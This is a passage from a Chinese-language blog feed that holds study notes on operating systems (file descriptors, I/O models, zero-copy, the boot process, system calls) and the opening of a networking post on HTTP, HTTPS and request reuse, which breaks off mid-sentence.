Link）</h3><ul><li>类似快捷方式，指向目标文件路径</li><li>本质是一个独立文件</li><li>可以跨文件系统使用</li></ul><hr><h2 id="文件系统的挂载与卸载"><a href="#文件系统的挂载与卸载" class="headerlink" title="文件系统的挂载与卸载"></a>文件系统的挂载与卸载</h2><p>在 Unix&#x2F;Linux 中，所有设备上的文件系统都被“挂载”到主目录树上。</p><ul><li>使用 <code>mount</code> 命令将设备挂载到某个目录</li><li>使用 <code>umount</code> 卸载</li><li><code>/etc/fstab</code> 可配置开机自动挂载项</li></ul><p>挂载是将不同存储介质的内容统一整合到单一的目录结构中。</p><hr><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p><strong>文件描述符（File Descriptor，FD）</strong> 是一个相对抽象的概念，但它在操作系统（尤其是 Linux&#x2F;Unix 系统）中起着至关重要的作用。简而言之，文件描述符是一个整数，用于标识一个打开的文件或 I&#x2F;O 资源（如套接字、管道等）。</p><h3 id="文件描述符的基本概念"><a href="#文件描述符的基本概念" class="headerlink" title="文件描述符的基本概念"></a>文件描述符的基本概念</h3><p>在 Linux&#x2F;Unix 系统中，当一个进程打开一个文件或设备时，操作系统会分配一个文件描述符来引用该文件或设备。进程通过文件描述符与文件或设备进行交互，而不是直接操作文件名或设备。</p><p>可以将文件描述符看作是一个“<strong>索引</strong>”，它指向操作系统内核中的一个数据结构，该数据结构描述了打开文件的相关信息，如文件的位置、文件的读写权限、文件的类型等。</p><h3 id="文件描述符的范围"><a href="#文件描述符的范围" class="headerlink" title="文件描述符的范围"></a>文件描述符的范围</h3><ul><li><strong>标准输入（stdin）</strong>：文件描述符 0</li><li><strong>标准输出（stdout）</strong>：文件描述符 1</li><li><strong>标准错误（stderr）</strong>：文件描述符 2</li></ul><p>这些是系统启动时就自动打开的文件描述符，通常用来处理命令行输入输出。</p><p>对于用户程序打开的文件或设备，操作系统会从 3 开始分配文件描述符。每打开一个文件或 I&#x2F;O 资源，操作系统会返回一个新的文件描述符。</p><h3 id="文件描述符与文件操作"><a href="#文件描述符与文件操作" class="headerlink" title="文件描述符与文件操作"></a>文件描述符与文件操作</h3><p>文件描述符是进程与文件、套接字等 I&#x2F;O 资源进行交互的 <strong>接口</strong>。通过文件描述符，进程可以执行各种操作，如读取、写入、关闭等。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><ul><li><strong>打开文件</strong>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;file.txt&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure><p>这里，<code>open()</code> 系统调用返回一个文件描述符 <code>fd</code>，它代表了 <code>&quot;file.txt&quot;</code> 这个文件。</p><ul><li><strong>读写文件</strong>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> bytes_read = read(fd, buffer, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><p><code>read()</code> 系统调用使用文件描述符 <code>fd</code> 来读取文件内容。</p><ul><li><strong>关闭文件</strong>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">close(fd);</span><br></pre></td></tr></table></figure><p><code>close()</code> 系统调用用来关闭文件描述符 <code>fd</code>，释放内核资源。</p><h3 id="文件描述符的底层实现"><a href="#文件描述符的底层实现" class="headerlink" title="文件描述符的底层实现"></a>文件描述符的底层实现</h3><p>操作系统内部使用文件描述符来管理文件。每个文件描述符对应一个 <strong>文件表项</strong>（file table entry），它包含了以下信息：</p><ul><li>文件的偏移量（即文件指针的位置）</li><li>文件的访问权限</li><li>当前打开的文件的状态（如是否已打开）</li></ul><p>这些信息存在于操作系统内核的内存中。当进程使用文件描述符进行操作时，内核会根据该描述符查找对应的文件表项，从而完成对文件的读写、关闭等操作。</p><h3 id="文件描述符的用途"><a href="#文件描述符的用途" class="headerlink" title="文件描述符的用途"></a>文件描述符的用途</h3><p>文件描述符不仅仅用于文件，还用于其他类型的 I&#x2F;O 资源，如：</p><ul><li><strong>网络套接字（Socket）</strong>：用于处理网络通信。</li><li><strong>管道（Pipe）</strong>：用于进程间通信（IPC）。</li><li><strong>设备文件</strong>：如 <code>/dev/null</code>、<code>/dev/sda</code> 等，表示硬件设备。</li></ul><p>因此，文件描述符是操作系统实现 I&#x2F;O 操作的一个 <strong>抽象接口</strong>，它使得程序可以通过统一的方式访问不同的资源。</p><h3 id="示例：标准输入输出的使用"><a href="#示例：标准输入输出的使用" class="headerlink" title="示例：标准输入输出的使用"></a>示例：标准输入输出的使用</h3><p>在 C 语言中，你可以通过文件描述符直接进行标准输入输出操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> bytes_read = read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf));  <span class="comment">// 从标准输入读取数据，文件描述符 0 是标准输入</span></span><br><span class="line">    write(<span class="number">1</span>, buf, bytes_read);  <span class="comment">// 向标准输出写入数据，文件描述符 1 是标准输出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>0</code> 和 <code>1</code> 就是标准输入和标准输出的文件描述符，<code>read()</code> 和 <code>write()</code> 系统调用通过这些文件描述符与 I&#x2F;O 设备交互。</p><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>文件描述符</strong> 是操作系统分配给进程的整数，用于表示已打开的文件、套接字、管道等 I&#x2F;O 资源。</li><li>它是进程与外部资源进行交互的 <strong>抽象接口</strong>，允许操作系统统一管理所有类型的 I&#x2F;O 操作。</li><li>文件描述符通常从 3 开始，标准输入、标准输出、标准错误分别是 0、1、2。</li><li>通过文件描述符，程序可以执行如读取、写入、关闭等操作，而无需直接处理底层的设备细节。</li></ul><p>虽然文件描述符的概念抽象，但它是操作系统中 I&#x2F;O 操作的基础，理解它有助于更好地掌握系统资源的管理。</p><hr><h1 id="设备管理与I-O系统"><a href="#设备管理与I-O系统" class="headerlink" title="设备管理与I&#x2F;O系统"></a>设备管理与I&#x2F;O系统</h1><h2 id="设备管理的目标"><a href="#设备管理的目标" class="headerlink" title="设备管理的目标"></a>设备管理的目标</h2><p>操作系统中的设备管理负责协调各种<strong>输入输出设备</strong>的访问和调度，包括磁盘、键盘、显示器、网卡、打印机等。</p><p>主要目标包括：</p><ul><li><strong>统一接口</strong>：为应用程序屏蔽硬件差异</li><li><strong>资源共享</strong>：协调多个进程访问同一设备</li><li><strong>并发控制</strong>：避免冲突和竞争</li><li><strong>性能优化</strong>：提升设备利用率和响应速度</li></ul><hr><h2 id="设备的分类"><a href="#设备的分类" class="headerlink" title="设备的分类"></a>设备的分类</h2><p>按功能和控制方式，设备可以分为以下几类：</p><h3 id="按功能划分"><a href="#按功能划分" class="headerlink" title="按功能划分"></a>按功能划分</h3><ul><li><strong>块设备（Block Devices）</strong>：以固定大小块为单位读写，如硬盘、SSD、光驱</li><li><strong>字符设备（Character Devices）</strong>：按字节流方式读写，如串口、键盘、鼠标</li><li><strong>网络设备（Network Devices）</strong>：进行数据包发送和接收，如网卡</li></ul><h3 id="按访问方式划分"><a href="#按访问方式划分" class="headerlink" title="按访问方式划分"></a>按访问方式划分</h3><ul><li><strong>随机访问设备</strong>：如磁盘，支持跳转到任意位置读写</li><li><strong>顺序访问设备</strong>：如磁带，必须按顺序读取</li></ul><hr><h2 id="驱动程序的作用"><a href="#驱动程序的作用" class="headerlink" title="驱动程序的作用"></a>驱动程序的作用</h2><p>设备驱动程序是设备和操作系统之间的“翻译官”，将统一的系统调用接口转换成设备控制指令。</p><p>驱动程序通常以模块形式加载到内核中，具备以下特性：</p><ul><li>面向特定硬件编写，强依赖设备细节</li><li>提供初始化、读写、中断处理等功能</li><li>支持热插拔、错误恢复、功耗管理等高级功能</li></ul><p>现代操作系统使用 **设备树（Device Tree）**或 <strong>ACPI 表</strong>进行设备发现和初始化。</p><hr><h2 id="I-O-操作的基本流程"><a href="#I-O-操作的基本流程" class="headerlink" title="I&#x2F;O 操作的基本流程"></a>I&#x2F;O 操作的基本流程</h2><p>一次典型的 I&#x2F;O 操作大致流程如下：</p><ol><li>用户调用标准库函数（如 <code>read()</code>、<code>write()</code>）</li><li>操作系统发出系统调用，进入内核</li><li>驱动程序控制设备开始传输</li><li>设备完成操作后发送中断信号</li><li>操作系统唤醒等待进程，返回数据</li></ol><hr><h2 id="I-O-模型"><a href="#I-O-模型" class="headerlink" title="I&#x2F;O 模型"></a>I&#x2F;O 模型</h2><p>操作系统提供多种 I&#x2F;O 模型，用于平衡“等待时间”和“并发能力”。</p><h3 id="阻塞-I-O"><a href="#阻塞-I-O" class="headerlink" title="阻塞 I&#x2F;O"></a>阻塞 I&#x2F;O</h3><p>调用方发出 I&#x2F;O 请求后，<strong>阻塞等待</strong>数据返回，适合简单场景，但性能不高。</p><h3 id="非阻塞-I-O"><a href="#非阻塞-I-O" class="headerlink" title="非阻塞 I&#x2F;O"></a>非阻塞 I&#x2F;O</h3><p>立即返回，如果没有数据可读，则返回错误码。适合轮询模型。</p><h3 id="多路复用-I-O（select-poll-epoll）"><a href="#多路复用-I-O（select-poll-epoll）" class="headerlink" title="多路复用 I&#x2F;O（select&#x2F;poll&#x2F;epoll）"></a>多路复用 I&#x2F;O（select&#x2F;poll&#x2F;epoll）</h3><p>单个线程监控多个 I&#x2F;O 事件，适合高并发网络服务器。</p><ul><li><code>select</code>：支持有限文件描述符，性能一般</li><li><code>poll</code>：不限数量，但每次都要遍历</li><li><code>epoll</code>：事件驱动机制，性能优越（Linux 特有）</li></ul><h3 id="异步-I-O（AIO）"><a href="#异步-I-O（AIO）" class="headerlink" title="异步 I&#x2F;O（AIO）"></a>异步 I&#x2F;O（AIO）</h3><p>I&#x2F;O 调用立即返回，操作系统<strong>后台完成数据传输</strong>后通知用户程序，真正意义上的“非阻塞”。</p><ul><li>实现复杂，但极大减少线程上下文切换</li><li>在高性能服务器和数据库中常见</li></ul><hr><h2 id="中断机制与-DMA"><a href="#中断机制与-DMA" class="headerlink" title="中断机制与 DMA"></a>中断机制与 DMA</h2><h3 id="中断机制"><a href="#中断机制" class="headerlink" title="中断机制"></a>中断机制</h3><p>设备完成操作后，通过发送中断请求（IRQ）通知 CPU，无需程序主动等待。</p><ul><li><strong>硬件中断</strong>：设备主动发起</li><li><strong>软件中断</strong>：程序触发，如 <code>int 0x80</code> 系统调用</li></ul><p>中断处理程序运行在内核态，必须快速响应并尽快返回。</p><h3 id="DMA（Direct-Memory-Access）"><a href="#DMA（Direct-Memory-Access）" class="headerlink" title="DMA（Direct Memory Access）"></a>DMA（Direct Memory Access）</h3><p>DMA 控制器允许设备<strong>绕过 CPU 直接访问内存</strong>，极大提高 I&#x2F;O 效率。</p><ul><li>典型应用：磁盘读写、大规模数据传输</li><li>CPU 只需发出命令，数据搬运由 DMA 完成</li></ul><hr><h2 id="缓冲区与缓存机制"><a href="#缓冲区与缓存机制" class="headerlink" title="缓冲区与缓存机制"></a>缓冲区与缓存机制</h2><p>I&#x2F;O 操作通常通过缓冲区实现数据的<strong>批量传输</strong>，减少频繁调用和上下文切换：</p><ul><li><strong>用户缓冲区</strong>：由应用程序分配，如读取文件时的 buffer</li><li><strong>内核缓冲区</strong>：系统内部缓存区，如页缓存、IO 缓冲</li></ul><p>Linux 提供如下几种常见缓存机制：</p><ul><li><strong>页缓存（Page Cache）</strong>：文件内容缓存，提高读写性能</li><li><strong>目录项缓存（dentry cache）</strong>：目录路径缓存，提升文件系统效率</li><li><strong>inode 缓存</strong>：保存文件 inode 信息，避免重复读盘</li></ul><hr><h2 id="I-O-调度算法"><a href="#I-O-调度算法" class="headerlink" title="I&#x2F;O 调度算法"></a>I&#x2F;O 调度算法</h2><p>当多个进程同时请求磁盘 I&#x2F;O 时，操作系统通过调度算法优化执行顺序：</p><ul><li><strong>FCFS（先来先服务）</strong>：简单但效率低</li><li><strong>SSTF（最短寻道时间优先）</strong>：优先处理距离当前磁头最近的请求</li><li><strong>SCAN（电梯算法）</strong>：磁头像电梯一样来回移动处理请求</li><li><strong>CFQ（完全公平队列）</strong>：为每个进程分配时间片，保持公平性（Linux 默认）</li></ul><hr><h2 id="设备文件与-dev-目录"><a href="#设备文件与-dev-目录" class="headerlink" title="设备文件与 &#x2F;dev 目录"></a>设备文件与 &#x2F;dev 目录</h2><p>Linux 中设备被抽象为文件，统一存储在 <code>/dev</code> 目录中。</p><ul><li>每个设备文件对应一个驱动和设备实例</li><li>使用主设备号（major）标识驱动程序</li><li>使用次设备号（minor）标识设备编号</li></ul><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/dev/sda      <span class="comment"># 第一块磁盘</span></span><br><span class="line">/dev/tty0     <span class="comment"># 第一个终端</span></span><br><span class="line">/dev/null     <span class="comment"># 空设备，丢弃写入数据</span></span><br></pre></td></tr></table></figure><hr><h2 id="零拷贝"><a href="#零拷贝" class="headerlink" title="零拷贝"></a>零拷贝</h2><p><strong>零拷贝 <strong>指的是在数据传输过程中，尽量</strong>避免 CPU 进行多次内存拷贝</strong>操作，从而提升 I&#x2F;O 性能，降低 CPU 负载，尤其适用于高性能网络服务和大文件传输场景。</p><p>传统的数据传输方式在用户态和内核态之间涉及<strong>多次数据复制</strong>，而零拷贝通过各种机制尽量避免这些不必要的拷贝。</p><hr><h3 id="传统-I-O-的拷贝过程（以发送文件为例）"><a href="#传统-I-O-的拷贝过程（以发送文件为例）" class="headerlink" title="传统 I&#x2F;O 的拷贝过程（以发送文件为例）"></a>传统 I&#x2F;O 的拷贝过程（以发送文件为例）</h3><p>以一个应用程序发送文件数据到网络为例，传统流程大概如下：</p><ol><li>磁盘上的文件内容通过 DMA 拷贝到内核缓冲区（Page Cache）</li><li>操作系统通过 <code>read()</code> 将数据从内核缓冲区拷贝到用户缓冲区（用户态）</li><li>应用程序调用 <code>send()</code>，再把用户缓冲区数据拷贝回内核的 socket 缓冲区</li><li>最后，数据通过网卡 DMA 发送出去</li></ol><p>这整个过程涉及<strong>两次用户态和内核态之间的内存拷贝</strong>，非常耗费 CPU 和内存带宽。</p><hr><h3 id="零拷贝是怎么做的"><a href="#零拷贝是怎么做的" class="headerlink" title="零拷贝是怎么做的"></a>零拷贝是怎么做的</h3><p>为了优化这类过程，现代操作系统（尤其是 Linux）支持一系列“零拷贝”技术主要思想是<strong>消除用户态和内核态之间的数据拷贝</strong>，从本质上说，零拷贝的优化目标是：</p><ul><li><strong>避免用户态 <strong><strong>↔</strong></strong> 内核态的数据拷贝</strong></li><li><strong>利用 DMA</strong>（Direct Memory Access）进行磁盘或网卡直接读写</li><li><strong>重用页缓存</strong>或<strong>内存映射</strong>等机制，减少数据搬运</li></ul><p>常见方式有：</p><h4 id="sendfile-系统调用"><a href="#sendfile-系统调用" class="headerlink" title="sendfile() 系统调用"></a><code>sendfile()</code> 系统调用</h4><p>这是 Linux 最常用的零拷贝接口，专门用来将一个文件“直接发送”到网络套接字。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendfile(out_fd, in_fd, <span class="literal">NULL</span>, len);</span><br></pre></td></tr></table></figure><ul><li>内核内部直接将磁盘数据从 Page Cache 映射到 socket 缓冲区</li><li>避免用户态中间缓冲，<strong>完全不经过用户空间</strong></li></ul><p>实现中仍可能使用 DMA 和 page remapping 等方式来减少复制次数。</p><h4 id="mmap-write"><a href="#mmap-write" class="headerlink" title="mmap() + write()"></a><code>mmap()</code> + <code>write()</code></h4><ul><li>使用 <code>mmap()</code> 将文件直接映射到进程地址空间</li><li>不显式复制数据，直接通过地址映射访问数据</li><li>可用于共享内存或文件映射，也算是一种“用户空间零拷贝”</li></ul><p>不过这种方式仍可能涉及写入时的额外 copy，不如 <code>sendfile()</code> 更彻底。</p><h4 id="splice-tee-vmsplice"><a href="#splice-tee-vmsplice" class="headerlink" title="splice() &#x2F; tee() &#x2F; vmsplice()"></a><code>splice()</code> &#x2F; <code>tee()</code> &#x2F; <code>vmsplice()</code></h4><p>这是 Linux 提供的更底层的零拷贝接口，用于在文件描述符之间转移数据：</p><ul><li><code>splice()</code>：把数据从一个文件描述符“管道”到另一个，不经用户态</li><li><code>tee()</code>：复制管道内容，不拷贝数据</li><li><code>vmsplice()</code>：把用户缓冲区直接插入到管道中</li></ul><p>这类接口配合管道&#x2F;套接字使用，可以实现极高性能的数据搬运（比如视频转发服务器）。</p><hr><h1 id="系统启动流程与内核机制"><a href="#系统启动流程与内核机制" class="headerlink" title="系统启动流程与内核机制"></a>系统启动流程与内核机制</h1><h2 id="系统启动的整体流程概览"><a href="#系统启动的整体流程概览" class="headerlink" title="系统启动的整体流程概览"></a>系统启动的整体流程概览</h2><p>从按下电源按钮开始，到桌面或命令行界面出现，操作系统经历了以下关键阶段：</p><ol><li><strong>固件初始化（BIOS 或 UEFI）</strong></li><li><strong>引导加载器（Bootloader）启动</strong></li><li><strong>内核加载与初始化</strong></li><li><strong>用户空间初始化（init 系统）</strong></li><li><strong>系统服务启动，进入用户交互界面</strong></li></ol><hr><h2 id="固件初始化（BIOS-UEFI）"><a href="#固件初始化（BIOS-UEFI）" class="headerlink" title="固件初始化（BIOS &#x2F; UEFI）"></a>固件初始化（BIOS &#x2F; UEFI）</h2><p>当电源接通后，主板上的 BIOS（老式）或 UEFI（现代）固件首先运行。</p><ul><li>负责进行 <strong>POST（Power-On Self Test）</strong>，检查内存、CPU、硬盘等是否正常</li><li>枚举设备，构建硬件环境信息</li><li>查找并加载引导设备（硬盘、U 盘等）上的引导加载器程序</li></ul><p>UEFI 是 BIOS 的升级版，支持图形界面、GPT 分区、网络引导等高级功能。</p><hr><h2 id="引导加载器（Bootloader）"><a href="#引导加载器（Bootloader）" class="headerlink" title="引导加载器（Bootloader）"></a>引导加载器（Bootloader）</h2><p>引导加载器是磁盘上最先运行的操作系统组件，负责将内核加载到内存中，并交出控制权。</p><p>常见引导程序包括：</p><ul><li><strong>GRUB（GRand Unified Bootloader）</strong>：最常用的 Linux 启动器</li><li><strong>LILO</strong>：早期的引导程序，已逐步被淘汰</li><li><strong>Windows Boot Manager</strong>：Windows 系统的启动器</li></ul><p>GRUB 的典型工作流程：</p><ol><li>加载自身（位于磁盘 MBR 或 EFI 分区）</li><li>显示操作系统菜单（多系统引导）</li><li>加载内核镜像（如 <code>/boot/vmlinuz</code>）到内存</li><li>加载 initrd&#x2F;initramfs 初始内存盘</li><li>跳转到内核入口地址开始执行</li></ol><hr><h2 id="内核初始化"><a href="#内核初始化" class="headerlink" title="内核初始化"></a>内核初始化</h2><p>内核接手之后，开始执行一系列底层初始化动作：</p><ul><li>检测和初始化 CPU、内存、I&#x2F;O 设备</li><li>建立中断向量表、内核页表、内存管理结构</li><li>启动内核线程，如 <code>kthreadd</code>、<code>ksoftirqd</code>、<code>kworker</code> 等</li><li>挂载根文件系统（从 initramfs 解压或磁盘中挂载 <code>/</code>）</li><li>执行第一个用户态进程：<code>/sbin/init</code>（或 systemd）</li></ul><p>这一步之后，内核正式进入“运行态”，并开始管理整个系统。</p><hr><h2 id="用户空间初始化（init-进程）"><a href="#用户空间初始化（init-进程）" class="headerlink" title="用户空间初始化（init 进程）"></a>用户空间初始化（init 进程）</h2><p><code>init</code> 进程是用户空间的第一个进程，其 PID 恒为 1，是所有用户进程的祖先。</p><p>目前主流的 <code>init</code> 系统有：</p><ul><li><strong>System V init</strong>：早期采用，使用脚本启动服务，串行启动，效率不高</li><li><strong>Upstart</strong>：Ubuntu 曾用，事件驱动模型</li><li><strong>systemd</strong>：现代 Linux 系统主流，支持并行启动、服务依赖管理、日志记录（journald）等功能</li></ul><p>systemd 会根据配置文件：</p><ol><li>启动目标单元（target，如 <code>graphical.target</code>）</li><li>启动后台服务（如 network、dbus、sshd）</li><li>启动登录界面（TTY、GDM、LightDM 等）</li></ol><p>最终进入用户交互状态。</p><hr><h2 id="用户态与内核态切换"><a href="#用户态与内核态切换" class="headerlink" title="用户态与内核态切换"></a>用户态与内核态切换</h2><p>操作系统运行在两个权限级别：</p><ul><li><strong>用户态（User Mode）</strong>：应用程序运行的环境，权限受限</li><li><strong>内核态（Kernel Mode）</strong>：内核代码运行环境，权限最高</li></ul><p>从用户态进入内核态的三种方式：</p><ol><li><strong>系统调用（syscall）</strong>：如 <code>read()</code>、<code>fork()</code>，用户显式请求操作系统服务</li><li><strong>中断（interrupt）</strong>：如硬件设备完成任务后发出的信号</li><li><strong>异常（exception）</strong>：如除以 0、访问非法内存等</li></ol><p>内核态执行完毕后，必须安全返回用户态，恢复之前的上下文信息。</p><hr><h2 id="系统调用机制"><a href="#系统调用机制" class="headerlink" title="系统调用机制"></a>系统调用机制</h2><p>系统调用是用户程序访问操作系统核心服务的唯一合法入口。</p><p>流程如下：</p><ol><li>用户程序调用 C 库函数（如 <code>open()</code>）</li><li>C 库使用 <code>syscall</code> 指令切入内核态</li><li>内核根据调用号（Syscall Number）执行对应的内核服务</li><li>执行完毕后切回用户态，返回结果</li></ol><p>Linux 使用软中断（int 0x80）或 <code>sysenter/syscall</code> 指令进行系统调用，效率较高。</p><hr><h2 id="内核模块与热插拔机制"><a href="#内核模块与热插拔机制" class="headerlink" title="内核模块与热插拔机制"></a>内核模块与热插拔机制</h2><p>内核为提高灵活性，将部分功能设计成可加载模块（<code>.ko</code> 文件），如文件系统、设备驱动等。</p><ul><li>使用 <code>insmod</code> 加载模块，<code>rmmod</code> 卸载模块</li><li>使用 <code>modprobe</code> 管理依赖关系</li><li>使用 <code>lsmod</code> 查看当前已加载模块</li></ul><p>模块机制支持设备<strong>热插拔</strong>、内核调试和按需加载。</p><hr><h2 id="内核日志与调试"><a href="#内核日志与调试" class="headerlink" title="内核日志与调试"></a>内核日志与调试</h2><p>Linux 提供多种内核日志和调试工具：</p><ul><li><code>dmesg</code>：查看启动日志和驱动信息</li><li><code>/proc</code> 文件系统：以文件方式提供内核状态信息（如 <code>/proc/cpuinfo</code>）</li><li><code>strace</code>：跟踪进程的系统调用</li><li><code>perf</code>：分析性能瓶颈</li><li><code>gdb</code> + <code>qemu</code>：进行内核级调试</li></ul><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;操作系统的基本概念&quot;&gt;&lt;a href=&quot;#操作系统的基本概念&quot; class=&quot;headerlink&quot; title=&quot;操作系统的基本概念&quot;&gt;&lt;/a&gt;操作系统的基本概念&lt;/h1&gt;&lt;h2 id=&quot;什么是操作系统&quot;&gt;&lt;a href=&quot;#什么是操作系统&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="操作系统" scheme="https://lyi61pd.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>网络</title>
    <link href="https://lyi61pd.github.io/2025/04/16/%E7%BD%91%E7%BB%9C/"/>
    <id>https://lyi61pd.github.io/2025/04/16/%E7%BD%91%E7%BB%9C/</id>
    <published>2025-04-16T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>计算机网络是一组通过通信链路互相连接的计算设备，它们之间可以进行数据传输、信息共享与远程控制。现在使用的手机、电脑和服务器之间的所有数据交换，都依赖计算机网络的支持。</p><p>网络不只是“上网”，而是一整套庞大而复杂的通信机制。为了规范这套机制，人们制定了大量的“网络协议”，这些协议就像交通规则，定义了数据如何发送、接收、确认、重传等等。</p><p>整个网络通信体系可以理解为一个“层级架构”，常见的是“<strong>五层网络模型</strong>”，它从上到下分为：</p><ul><li>应用层：你直接接触的网络服务，比如浏览器、微信、QQ 等。</li><li>传输层：保障数据可靠或高效传输的机制，代表协议有 TCP、UDP。</li><li>网络层：负责选择数据传输路径，代表协议是 IP。</li><li>数据链路层：确保在局域网中一跳一跳地正确传送数据。</li><li>物理层：底层的电缆、网卡、电信号等。</li></ul><p>有了这种分层结构，网络系统可以更易于开发、维护和理解。</p><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>应用层位于网络模型的最顶层，直接面向使用者。无论是浏览网页、登录社交平台、收发电子邮件，底层传输的数据最终都要通过应用层协议来组织和解析。应用层不关心数据如何传输，它只关心数据<strong>怎么表达、如何理解</strong>。</p><p>每种网络应用都有对应的应用层协议，用来规定通信双方“说什么”和“怎么说”。就像人与人之间的交流需要语言规范一样，不同应用之间也需要统一协议来协作。</p><hr><h2 id="HTTP-协议的基本结构与特性"><a href="#HTTP-协议的基本结构与特性" class="headerlink" title="HTTP 协议的基本结构与特性"></a>HTTP 协议的基本结构与特性</h2><p>HTTP 是使用最广泛的应用层协议，主要用于浏览器与服务器之间的数据交互。它的特点是<strong>无状态</strong>、<strong>基于文本</strong>、<strong>灵活可扩展</strong>。</p><p>一个标准的 HTTP 请求包含三个部分：</p><ul><li>请求行：例如 <code>GET /index.html HTTP/1.1</code></li><li>请求头：包含 Host、User-Agent、Accept、Cookie 等字段</li><li>请求体：主要出现在 POST 请求中，用于提交数据</li></ul><p>HTTP 协议版本的演进也带来了性能的逐步优化：</p><ul><li><strong>HTTP&#x2F;1.1</strong> 支持持久连接（Keep-Alive），避免每次请求都重新建立连接</li><li><strong>HTTP&#x2F;2</strong> 引入多路复用，多个请求可以复用同一个 TCP 连接，避免阻塞</li><li><strong>HTTP&#x2F;3</strong> 改用基于 UDP 的 QUIC 协议，减少连接建立时间并增强安全性</li></ul><hr><h2 id="HTTPS-与加密通信机制"><a href="#HTTPS-与加密通信机制" class="headerlink" title="HTTPS 与加密通信机制"></a>HTTPS 与加密通信机制</h2><p>HTTPS 本质上是 HTTP 协议在 TLS 加密通道下的运行方式，主要解决通信过程中的信息泄露和篡改问题。</p><p>使用 HTTPS 时，客户端和服务器会先进行一次 TLS 握手，主要流程包括：</p><ol><li>客户端发起连接，带上支持的加密算法</li><li>服务器返回数字证书、公钥等信息</li><li>客户端验证证书合法性，生成对称密钥并加密传输</li><li>双方使用对称密钥进行后续通信</li></ol><hr><h2 id="HTTP-请求复用"><a href="#HTTP-请求复用" class="headerlink" title="HTTP 请求复用"></a>HTTP 请求复用</h2><p>HTTP 请求复用是指在同一个网络连接中，多个 HTTP 请求和响应可以被顺序发送和接收，而不需要为每个请求建立新的连接。这个机制是为了提高网络传输的效率，减少延迟和提高资源利用率。</p><p>HTTP 的请求复用在不同版本的协议中有不同的实现方式，主要体现在 <strong>HTTP&#x2F;1.x</strong> 和 <strong>HTTP&#x2F;2</strong> 的实现上。</p><h3 id="HTTP-1-x-的请求复用（有限）"><a href="#HTTP-1-x-的请求复用（有限）" class="headerlink" title="HTTP&#x2F;1.x 的请求复用（有限）"></a><strong>HTTP&#x2F;1.x 的请求复用（有限）</strong></h3><p>在 <strong>HTTP&#x2F;1.0</strong> 和 <strong>HTTP&#x2F;1.1</strong> 中，尽管有一定的复用机制，但也有其局限性：</p><h4 id="HTTP-1-0（无持久连接）"><a href="#HTTP-1-0（无持久连接）" class="headerlink" title="HTTP&#x2F;1.0（无持久连接）"></a><strong>HTTP&#x2F;1.0（无持久连接）</strong></h4><ul><li>在 <strong>HTTP&#x2F;1.0</strong> 中，每一个请求都需要独立建立一个新的 TCP 连接，之后该连接关闭。这意味着如果一个页面需要多个资源（如图片、CSS、JavaScript 文件等），每个资源都需要一个独立的连接，这会导致连接建立和关闭的开销非常大。</li></ul><h4 id="HTTP-1-1（支持持久连接）"><a href="#HTTP-1-1（支持持久连接）" class="headerlink" title="HTTP&#x2F;1.1（支持持久连接）"></a><strong>HTTP&#x2F;1.1（支持持久连接）</strong></h4><ul><li><strong>持久连接</strong>：<strong>HTTP&#x2F;1.1</strong> 引入了持久连接（Persistent Connection，<code>Connection: keep-alive</code>），允许多个请求和响应复用同一个 TCP 连接，从而避免了为每个请求建立新连接的开销。<ul><li><strong>Keep-Alive</strong>：通过 <code>Connection: keep-alive</code> 头部，HTTP&#x2F;1.1 允许在一个连接上发送多个请求和接收多个响应，而无需每次都重新建立连接。</li><li>但是，HTTP&#x2F;1.1 的复用也有限制。即使同一个连接上可以发送多个请求，它仍然是按顺序处理的，每次请求都必须等待前一个请求的响应完成（<strong>队头阻塞</strong>问题：指的是由于一个数据包或请求的延迟，导致同一连接中的后续数据包或请求也必须等待这个延迟的数据包或请求完成，从而造成整体的延迟增加）。这意味着多个请求不能并行地发送。</li></ul></li></ul><h3 id="HTTP-2-的请求复用（更高效）"><a href="#HTTP-2-的请求复用（更高效）" class="headerlink" title="HTTP&#x2F;2 的请求复用（更高效）"></a><strong>HTTP&#x2F;2 的请求复用（更高效）</strong></h3><p><strong>HTTP&#x2F;2</strong> 